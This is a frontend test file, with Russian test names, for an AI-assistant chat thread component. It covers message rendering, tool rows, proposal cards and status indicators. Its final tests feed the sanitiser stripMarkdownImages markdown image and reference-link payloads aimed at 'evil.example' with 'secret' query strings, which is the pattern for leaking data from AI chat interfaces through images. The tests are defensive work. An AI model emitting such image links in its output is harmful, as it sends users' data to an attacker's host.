import { screen, within } from "@testing-library/react";
import { describe, expect, it } from "vitest";

import type { ThreadItem } from "../../lib/assistant/events";
import { AssistantThread, stripMarkdownImages } from "./AssistantThread";
import { mockPlatformMcp, renderInRouter } from "./test-fixtures";

const SESSION_PREVIEW = {
  tool: "create_session",
  preview_digest: "x",
  operations: [{ index: 0, tool: "create_session", kind: "session", class: "create" }],
  session: { agent_name: "А", agent_version: 1, environment_name: "Е", title: "Т", files: [], tools: [], mcp_servers: [], skills: [], network: null },
};

describe("AssistantThread", () => {
  it("реплики пользователя и ответы ассистента", () => {
    const items: ThreadItem[] = [
      { kind: "user", id: "u1", text: "Создай агента" },
      { kind: "assistant", id: "a1", text: "Сначала уточню **два** вопроса" },
    ];
    renderInRouter(<AssistantThread items={items} sessionId="s1" running={false} />);
    expect(screen.getByText("Создай агента")).toBeInTheDocument();
    expect(screen.getByText("два").tagName).toBe("STRONG");
  });

  it("чтение это свёрнутая строка без карточки", () => {
    const items: ThreadItem[] = [
      { kind: "read", id: "r1", tool: "list", label: "Прочитал список: сессии (12)", status: "done" },
      { kind: "read", id: "r2", tool: "get", label: "Читаю: агент a1", status: "running" },
      { kind: "read", id: "r3", tool: "get", label: "Прочитал: агент b", status: "error" },
    ];
    renderInRouter(<AssistantThread items={items} sessionId="s1" running={false} />);
    expect(screen.getByText("Прочитал список: сессии (12)")).toBeInTheDocument();
    expect(screen.getByText("Читаю: агент a1")).toBeInTheDocument();
    expect(screen.getByText("Не вышло", { selector: ".sr-only" })).toBeInTheDocument();
    expect(screen.queryByRole("button")).toBeNull();
  });

  it("ссылка из request_secret ведёт внутрь консоли", () => {
    const items: ThreadItem[] = [
      { kind: "read", id: "r1", tool: "request_secret", label: "Ссылка на форму секрета: TOKEN", status: "done", link: "/vaults/v1" },
    ];
    renderInRouter(<AssistantThread items={items} sessionId="s1" running={false} />);
    expect(screen.getByRole("link", { name: "Ссылка на форму секрета: TOKEN" })).toHaveAttribute("href", "/vaults/v1");
  });

  it("каждое предложение получает свою карточку", async () => {
    mockPlatformMcp([SESSION_PREVIEW]);
    const items: ThreadItem[] = [
      { kind: "proposal", id: "p1", tool: "create_session", input: {}, phase: "pending" },
      { kind: "proposal", id: "p2", tool: "create_skill", input: {}, phase: "applied", applied: [{ tool: "create_skill", kind: "skill", id: "s", name: "Н", version: 1, action: "create" }] },
      { kind: "proposal", id: "p3", tool: "send_message", input: {}, phase: "denied" },
      { kind: "proposal", id: "p4", tool: "apply_changes", input: {}, phase: "failed", resultText: "ошибка" },
    ];
    renderInRouter(<AssistantThread items={items} sessionId="s1" running={false} />);
    expect(await screen.findByText("Создать сессию")).toBeInTheDocument();
    expect(screen.getByRole("link", { name: "Создан навык «Н», версия 1" })).toBeInTheDocument();
    expect(screen.getAllByText("Отклонено").length).toBe(1);
    expect(screen.getByText("ошибка")).toBeInTheDocument();
    expect(screen.getAllByRole("article")).toHaveLength(4);
  });

  it("черновики карточек модели и harness", () => {
    const items: ThreadItem[] = [
      { kind: "draft", id: "d1", draftKind: "model_card", body: { model_id: "m" } },
      { kind: "draft", id: "d2", draftKind: "harness_card", body: { name: "H" } },
    ];
    renderInRouter(<AssistantThread items={items} sessionId="s1" running={false} />);
    expect(screen.getByText("Черновик карточки модели")).toBeInTheDocument();
    expect(screen.getByText("Черновик карточки harness")).toBeInTheDocument();
  });

  it("пока ассистент работает, показывает индикатор", () => {
    renderInRouter(<AssistantThread items={[]} sessionId="s1" running />);
    expect(screen.getByRole("status", { name: "Ассистент работает" })).toBeInTheDocument();
  });

  it("ошибка сессии строкой", () => {
    renderInRouter(
      <AssistantThread items={[{ kind: "error", id: "e1", text: "модель недоступна" }]} sessionId="s1" running={false} />,
    );
    const alert = screen.getByRole("alert");
    expect(within(alert).getByText(/модель недоступна/)).toBeInTheDocument();
  });
});

describe("stripMarkdownImages", () => {
  it("убирает картинки, чтобы адрес не загружался", () => {
    expect(stripMarkdownImages("до ![схема](https://evil.example/a.png?d=секрет) после")).toBe("до [схема] после");
    expect(stripMarkdownImages("![](https://evil.example/p.gif)")).toBe("");
    expect(stripMarkdownImages("![alt][r]\n\n[r]: https://evil.example")).toContain("[alt]");
    expect(stripMarkdownImages("обычная [ссылка](https://example.com)")).toBe("обычная [ссылка](https://example.com)");
  });

  it("в ленте картинка не создаёт img", () => {
    const { container } = renderInRouter(
      <AssistantThread
        items={[{ kind: "assistant", id: "a", text: "смотри ![x](https://evil.example/i.png)" }]}
        sessionId="s"
        running={false}
      />,
    );
    expect(container.querySelector("img")).toBeNull();
  });

  it.each([
    "![leak]\n\n[leak]: https://evil.example/c?d=секрет",
    "![leak][]\n\n[leak]: https://evil.example/c?d=секрет",
    "![leak][ref]\n\n[ref]: https://evil.example/c?d=секрет",
    "[![x](https://evil.example/c?d=1)](https://example.com)",
  ])("картинка по ссылке-сноске тоже не создаёт img: %s", (text) => {
    const { container } = renderInRouter(
      <AssistantThread items={[{ kind: "assistant", id: "a", text }]} sessionId="s" running={false} />,
    );
    expect(container.querySelector("img")).toBeNull();
    expect(container.innerHTML).not.toContain("evil.example/c?d=секрет");
  });
});
